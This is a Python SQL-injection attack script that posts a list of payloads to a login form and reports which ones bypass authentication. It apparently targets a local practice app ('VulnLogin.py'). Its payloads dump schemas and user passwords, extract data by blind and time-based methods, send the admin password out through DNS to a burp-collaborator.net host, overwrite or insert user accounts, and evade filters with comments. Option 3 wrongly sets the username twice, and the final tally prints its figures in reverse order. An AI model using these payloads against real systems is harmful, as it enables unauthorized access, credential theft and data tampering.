import requests

pay = [
    "admin' -- ",
    "admin' #",
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "' OR 1=1#",
    "admin' OR '1'='1' -- ",
    "admin' OR 1=1 -- ",
    "' UNION SELECT 1,'admin','7c6a180b36896a0a8c02787eeafb0e4c' -- ",
    "' UNION SELECT 1, schema_name, 3 FROM information_schema.schemata -- ",
    "' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema = database() -- ",
    "' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name = 'users' -- ",
    "' UNION SELECT 1, username, password FROM users -- ",
    "' UNION SELECT 1, user(), 3 -- ",
    "' UNION SELECT 1, @@version, 3 -- ",
    "' UNION SELECT 1, database(), 3 -- ",
    "admin' AND ExtractValue(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) -- ",
    "admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- ",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users WHERE username='admin' LIMIT 1),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) -- ",
    "admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' -- ",
    "admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>10 -- ",
    "admin' AND (SELECT SUBSTRING(@@version,1,1))='8' -- ",
    "admin' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0) -- ",
    "admin' AND IF((SELECT SUBSTRING(@@version,1,1))='8', SLEEP(5), 0) -- ",
    "'; IF((SELECT COUNT(*) FROM users)=3, SLEEP(5), 0) -- ",
    "'; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin' LIMIT 1), '.burp-collaborator.net\\abc')) -- ",
    "'; DELIMITER // ; CREATE PROCEDURE exploit() BEGIN DECLARE i VARCHAR(500); SET i = (SELECT password FROM users LIMIT 1); SET @a = CONCAT('\\\\', i, '.burp-collaborator.net\\abc'); LOAD_FILE(@a); END; // ; CALL exploit() // -- ",
    "'; UPDATE users SET password = 'hacked' WHERE username = 'admin'; -- ",
    "'; INSERT INTO users (username, password) VALUES ('attacker', 'pwned'); -- ",
    "'; CREATE TABLE hacked (data varchar(255)); -- ",
    "admin'/**/OR/**/1=1/**/",
    "'/**/UNION/**/SELECT/**/1,2,3/**/",
    "admin'/*!50000OR*/1=1-- -"
]

def SqlAtcking():
    Succes=0
    url = "http://localhost:5002/login/"
    try:
        head = requests.head(url, timeout=5)
        if head.status_code == 404:
            print("[!] URL 404, please first run ** python3 VulnLogin.py")
            return
    except:
        print("[!] URL not reachable, please first run ** python3 VulnLogin.py")
        return
    print("""
        Choice payload methods :
             1. config 1  =>  username: payload , password: 1
             2. config 2 =>  username: payload , password: payload
             3. config 3 =>  username: 1 , password: payload
   """)
    c=input("Enter Payload requests method: ").strip()
    for payload in pay:
        if c== "1":
            config = [{
                "username": payload,
                "password": "1"
            },"username: payload, password: 1"]
        elif c == "2":
            config=[{
                "username":payload,
                "password":payload
            }," username: payload, password: payload"]
        elif c == "3":
            config=[{
                "username":"1",
                "username":payload
           }," username: 1, password: payload"]
        else:
            print(f"Invalid choice '{c}', using option 1 by default.")
            config = [{
                "username": payload,
                "password": "1"
           },"username: payload, password: 1"]
        try:
            r = requests.post(url, data=config[0])
        except Exception as e:
            print(f"Request failed for payload: {payload}\nErro")
            continue
        print(f"Status: {r.status_code}")
        if "Logout" in r.text:
            print(f"[+] Injection successful with: {payload}")
            Succes+=1
        else:
            print(f"[-] Not working: {payload}")
    print(f"\n [****] Final succes amount {len(pay)}/{Succes} <=> config => {config[1]}")

